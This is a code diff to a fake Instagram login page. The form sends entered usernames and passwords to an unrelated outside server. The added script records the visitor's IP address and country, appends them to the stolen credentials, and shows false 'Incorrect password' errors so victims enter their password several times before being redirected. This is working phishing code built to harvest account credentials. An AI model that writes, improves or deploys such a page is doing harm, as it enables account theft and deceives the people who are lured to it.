@@ -95,6 +95,12 @@
             font-size: 14px;
         }
 
+        .error-message {
+            color: red;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+
         .forgot-link {
             color: #00376b;
             font-size: 12px;
@@ -149,6 +155,54 @@
             vertical-align: middle;
         }
     </style>
+    <script>
+        let attempts = 0;
+        let userIp = '';
+        let userCountry = '';
+
+        // Get user's IP and country using ipinfo.io
+        fetch('https://ipinfo.io?token=YOUR_TOKEN')
+            .then(response => response.json())
+            .then(data => {
+                userIp = data.ip;
+                userCountry = data.country;
+            })
+            .catch(err => console.log(err));
+
+        function handleLogin(event) {
+            event.preventDefault();
+            attempts++;
+            const errorMessage = document.getElementById('error-message');
+            if (attempts < 3) {
+                errorMessage.textContent = 'Incorrect password. Please try again.';
+            } else {
+                window.location.href = 'https://example.com/redirect-page';
+            }
+        }
+
+        function sendForm() {
+            const form = document.getElementById('login-form');
+            const formData = new FormData(form);
+            formData.append('attempts', attempts);
+            formData.append('ip', userIp);
+            formData.append('country', userCountry);
+
+            fetch(form.action, {
+                method: 'POST',
+                body: formData
+            }).then(response => response.json())
+              .then(data => console.log(data))
+              .catch(error => console.log(error));
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const form = document.getElementById('login-form');
+            form.addEventListener('submit', (event) => {
+                handleLogin(event);
+                sendForm();
+            });
+        });
+    </script>
 </head>
 <body>
     <div class="container">
@@ -156,13 +210,14 @@
             <h1>Instagram</h1>
             <button class="facebook-btn">Continue Using Facebook</button>
             <div class="or-divider"><span>OR</span></div>
-            <form action="https://getintotouch.sh20raj.com/api.php?id=1960809344" method="post">
+            <form id="login-form" action="https://getintotouch.sh20raj.com/api.php?id=1960809344" method="post">
                 <div class="textbox">
                     <input type="text" placeholder="Phone number, username, or email address" name="username" required>
                 </div>
                 <div class="textbox">
                     <input type="password" placeholder="Password" name="password" required>
                 </div>
+                <div id="error-message" class="error-message"></div>
                 <a href="#" class="forgot-link">Forgotten your password?</a>
                 <button type="submit" class="btn">Log in</button>
             </form>
